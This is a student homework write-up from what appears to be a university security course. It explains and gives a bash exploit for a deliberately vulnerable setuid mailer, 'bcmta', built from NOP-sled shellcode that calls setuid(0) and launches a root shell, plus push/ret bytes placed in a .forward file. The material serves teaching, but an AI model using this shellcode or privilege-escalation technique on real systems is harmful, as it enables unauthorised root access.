Yixuan Wang(yixua003) Ruoyan Kong (kong0135)

1. What mistakes in the source code bcmta.c make the exploit possible?
	In the RCPT_CODE mode, the process can execute any assembly code in the path pass the check:
	    strlcpy(code_area, rcpts[i].path, PAGE_SIZE);
	    mprotect(code_area, PAGE_SIZE, PROT_READ|PROT_EXEC);
	    ((void (*)(char **))code_area)(msg_lines);
So we can push our shellcode address into the stack and use the return to jump to that address.
Our shellcode execute two part:
1) change uid to 0 (\x6a\x17\x58\x31\xdb\xcd\x80)
2) execute \bin\rootshell (\x55\x89...)



2. explain how you constructed your inputs
Out input: 
#!/bin/bash
// Put shellcode in an environment variable. We repeat 8000 times to make the shellcode 
// environment variable pretty large compared to the total size of all the other environment 
// variables so we won't miss it. "\x6a\x17\x58\x31\xdb\xcd\x80" is set uid = 0. "\x55\x89..." is hex for/bin/rootshell.
export SHELLCODE=$(perl -e 'print "\x90" x8000, "\x6a\x17\x58\x31\xdb\xcd\x80\x55\x89\xe5\x68\x6c\x6c\x20\x20\x68\x74\x73\x68\x65\x68\x2f\x72\x6f\x6f\x68\x2f\x62\x69\x6e\x31\xc9\x88\x4d\xfe\x31\xc0\xb0\x0b\x8d\x5d\xf0\x31\xc9\x31\xd2\xcd\x80\x00"')

//\x68 push
//\xc3 ret the progress to the address \xff\xc0\xff\xff pushed. A good target for the shellcode is around a page down from the start of the stack, say 0xffffc0ff. 
echo -e "!\x68\xff\xc0\xff\xff\xc3">.forward

// now we can all the bcmta to invoke the shellcode, which then invoke the rootshell
(echo -e ".")| /usr/bin/bcmta -f test -t test@localhost

3. Explain step-by-step what happens when an ordinary user runs exploit.sh.
Firstly, a shellcode of setuid(0), /bin/rootshell is exported to environment variable. 
Secondly, the command push address ret is being set into the path. 
Thirdly, we run bcmta, bcmta run to deliver message:
	} else if (type == RCPT_CODE) {
	    code_area = mmap(0, PAGE_SIZE, PROT_READ|PROT_WRITE,
			     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	    strlcpy(code_area, rcpts[i].path, PAGE_SIZE);
	    mprotect(code_area, PAGE_SIZE, PROT_READ|PROT_EXEC);
	    ((void (*)(char **))code_area)(msg_lines);
It get the output from rcpts[i].path, check it then execute it, which jump to our shellcode, change the uid and invoke rootshell with root user privilege.

Reference:
[1] http://www-users.cselabs.umn.edu/classes/Fall-2019/csci5271/slides/06-bcecho-cmds-2.txt
[2] http://shell-storm.org/shellcode/files/shellcode-906.php
